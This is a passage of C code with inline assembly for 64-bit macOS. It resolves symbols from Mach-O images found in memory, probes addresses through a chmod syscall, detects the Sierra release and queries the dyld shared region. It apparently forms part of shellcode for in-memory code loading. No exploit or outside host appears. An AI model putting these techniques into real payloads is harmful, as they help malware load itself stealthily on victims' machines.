    } else if (lc->cmd == LC_SEGMENT_64) {
      sc = (struct segment_command_64 *)lc;
      char * segname = ((struct segment_command_64 *)lc)->segname;
      if (string_compare(segname, "__LINKEDIT") == 0) {
        linkedit = sc;
      } else if (string_compare(segname, "__TEXT") == 0) {
        text = sc;
      }
    }
    lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
  }

  if (!linkedit || !symtab || !text) {
    return 0;
  }

  unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
  strtab = (char *)(base + file_slide + symtab->stroff);

  nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
  for (int i=0; i<symtab->nsyms; i++) {
    char *name = strtab + nl[i].n_un.n_strx;
    /*#ifdef DEBUG*/
    /*print(name);*/
    /*print("\n");*/
    /*#endif*/
    if (string_compare(name, symbol) == 0) {
      return (void*)(nl[i].n_value + offset);
    }
  }

  return 0;
}

uint64_t syscall_chmod(uint64_t path, long mode)
{
  uint64_t chmod_no = 0x200000f;
  uint64_t ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(chmod_no), "S"(path), "g"(mode)
      :);
  return ret;
}

uint64_t find_macho(uint64_t addr, unsigned int increment)
{
  while(addr < MAX_OSXVM_ADDR) {
    uint64_t ptr = addr;
    unsigned long ret = syscall_chmod(ptr, 0777);
    if (ret == 0x2 && ((int *)ptr)[0] == MH_MAGIC_64) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

uint64_t find_dylib(uint64_t addr, unsigned int increment)
{
  while(addr < MAX_OSXVM_ADDR) {
    uint64_t ptr = addr;
    if (((int *)ptr)[0] == MH_MAGIC_64 && ((int *) ptr)[3] == MH_DYLIB) {
      return ptr;
    }

    addr += increment;
  }
  return 0;
}

int string_compare(const char* s1, const char* s2)
{
  while (*s1 != '\0' && *s1 == *s2)
  {
    s1++;
    s2++;
  }
  return (*(unsigned char *) s1) - (*(unsigned char *) s2);
}

void * memcpy2(void *dest, const void *src, size_t len)
{
  char *d = dest;
  const char *s = src;
  while (len--)
    *d++ = *s++;
  return dest;
}

int detect_sierra()
{
  uint64_t sc_sysctl = 0x20000ca;
  int name[] = { CTL_KERN, KERN_OSRELEASE };
  uint64_t nameptr = (uint64_t)&name;
  uint64_t namelen = sizeof(name)/sizeof(name[0]);
  char osrelease[32];
  size_t size = sizeof(osrelease);
  uint64_t valptr = (uint64_t)osrelease;
  uint64_t valsizeptr = (uint64_t)&size;
  uint64_t ret = 0;

  __asm__(
      "mov %1, %%rax;\n"
      "mov %2, %%rdi;\n"
      "mov %3, %%rsi;\n"
      "mov %4, %%rdx;\n"
      "mov %5, %%r10;\n"
      "xor %%r8, %%r8;\n"
      "xor %%r9, %%r9;\n"
      "syscall;\n"
      "mov %%rax, %0;\n"
      : "=g"(ret)
      : "g"(sc_sysctl), "g"(nameptr), "g"(namelen), "g"(valptr), "g"(valsizeptr)
      : );

  // osrelease is 16.x.x on Sierra
  if (ret == 0 && size > 2) {
    if (osrelease[0] == '1' && osrelease[1] < '6') {
      return 0;
    }
    if (osrelease[0] <= '9' && osrelease[1] == '.') {
      return 0;
    }
  }
  return 1;
}

uint64_t syscall_shared_region_check_np()
{
  long shared_region_check_np = 0x2000126; // #294
  uint64_t address = 0;
  unsigned long ret = 0;
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(shared_region_check_np), "g"(&address)
      : "rax", "rdi" );
  return address;
}

uint64_t roundUp(uint64_t numToRound, uint64_t multiple)
{
    if (multiple == 0)
        return numToRound;

    uint64_t remainder = numToRound % multiple;
    if (remainder == 0)
        return numToRound;

    return numToRound + multiple - remainder;
}

#ifdef DEBUG
int string_len(const char* s1)
{
  const char* s2 = s1;
  while (*s2 != '\0')
  {
    s2++;
  }
  return (s2 - s1);
}

void print(char * str)
{
  long write = 0x2000004;
  long stdout = 1;
  unsigned long len = string_len(str);
  unsigned long long addr = (unsigned long long) str;
  unsigned long ret = 0;
  /* ret = write(stdout, str, len); */
  __asm__(
      "movq %1, %%rax;\n"
      "movq %2, %%rdi;\n"
      "movq %3, %%rsi;\n"
      "movq %4, %%rdx;\n"
      "syscall;\n"
      "movq %%rax, %0;\n"
      : "=g"(ret)
      : "g"(write), "g"(stdout), "S"(addr), "g"(len)
      : "rax", "rdi", "rdx" );
}
#endif
